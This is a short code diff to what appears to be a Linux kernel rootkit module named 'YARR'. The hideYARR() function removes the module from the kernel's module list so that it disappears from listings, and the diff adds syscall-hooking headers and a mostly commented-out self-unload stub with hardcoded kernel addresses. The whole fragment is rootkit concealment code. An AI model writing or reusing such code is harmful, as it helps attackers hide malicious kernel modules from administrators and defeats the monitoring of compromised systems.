@@ -19,8 +19,13 @@
 
 #include <linux/list.h>
 #include <linux/module.h>
+#include <linux/fcntl.h>
+#include <linux/syscalls.h>
+#include <linux/unistd.h>
 
 #include "hide.h"
+#include "hook.h"
+#include "debug.h"
 
 // The list of modules loaded into the kernel and its mutex.
 extern struct list_head *modules;
@@ -41,9 +46,26 @@ int hideYARR() {
 	mutex_lock(&module_mutex);
 	yarr_module = THIS_MODULE;
 	if (likely(yarr_module))
-		list_del(&(yarr_module->list));
+		list_del_rcu(&yarr_module->list);
 	mutex_unlock(&module_mutex);
 
 	return res;
+}
+
+int unloadMe() {
+/*	struct module *yarr_module;*/
+	int res = 0;
+/*	void (*free_module)(struct module *mod) = (void (*)(struct module *))0xc10956a0;
+
+	yarr_module = THIS_MODULE;
+
+	// TODO: We should check that we are not in the list.
+	//mutex_lock(&module_mutex);
+	//list_add_rcu(&yarr_module->list, (struct list_head)0xc1822e58);
+	//mutex_unlock(&module_mutex);
+
+	debug("Aqui\n");
+	free_module(yarr_module);
+*/	return res;
 }
 
